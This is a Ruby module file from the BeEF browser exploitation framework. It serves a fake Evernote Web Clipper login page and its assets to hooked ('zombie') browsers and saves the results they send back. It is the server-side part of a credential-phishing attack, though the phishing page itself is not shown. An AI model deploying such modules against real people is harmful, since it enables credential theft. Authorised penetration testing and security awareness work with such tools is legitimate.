#
# Copyright (c) 2006-2018 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Fake_evernote_clipper < BeEF::Core::Command

  def pre_send
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_evernote_clipper/login.html','/ev/login','html')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_evernote_clipper/login.css','/ev/login','css')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_evernote_clipper/clipboard.png','/ev/clipboard','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_evernote_clipper/close_login.png','/ev/close_login','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_evernote_clipper/error-clip.png','/ev/error-clip','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_evernote_clipper/evernote_web_clipper.png','/ev/evernote_web_clipper','png')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_evernote_clipper/GothamSSm-Medium.otf','/ev/GothamSSm-Medium','otf')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/modules/social_engineering/fake_evernote_clipper/GothamSSm-Bold.otf','/ev/GothamSSm-Bold','otf')
    BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind('/core/main/client/lib/jquery-3.3.1.min.js','/ev/jquery','js')
  end

  #
  # This method is being called when a zombie sends some
  # data back to the framework.
  #
  def post_execute
    if (@datastore['meta'] == "KILLFRAME")
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/ev/login.html')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/ev/login.css')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/ev/clipboard.png')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/ev/close_login.png')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/ev/error-clip.png')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/ev/evernote_web_clipper.png')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/ev/GothamSSm-Medium.otf')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/ev/GothamSSm-Bold.otf')
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.unbind('/ev/jquery.js')
    end
    content = {}
    content['result'] = @datastore['result']
    save content
  end

end
